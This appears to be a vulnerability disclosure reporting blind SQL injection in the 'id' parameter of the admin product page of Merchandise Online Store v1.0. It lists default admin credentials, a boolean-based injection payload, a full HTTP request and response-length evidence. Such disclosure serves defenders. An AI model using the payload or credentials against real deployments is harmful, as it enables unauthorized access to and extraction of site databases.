# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/admin/?page=product/manage_product&id=

Vulnerability location: /vloggers_merch/admin/?page=product/manage_product&id=,id

[+] Payload: /vloggers_merch/admin/?page=product/manage_product&id=5%27%20and%20length(database())%20=17%20--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/admin/?page=product/manage_product&id=5%27%20and%20length(database())%20=17%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 30380

![image](https://user-images.githubusercontent.com/54017627/166880229-878f20bd-f433-473a-9e97-852e8b0fa08d.png)

![image](https://user-images.githubusercontent.com/54017627/166880330-243ad274-a586-434a-abfe-0a7e24780e9e.png)

When length (database ()) = 17, Content-Length: 33673

![image](https://user-images.githubusercontent.com/54017627/166880180-98bd34c9-69c0-4809-96ae-b985a9ffa5af.png)

![image](https://user-images.githubusercontent.com/54017627/166880274-6c48ef3a-31be-4fb1-9463-ef812430ddc0.png)
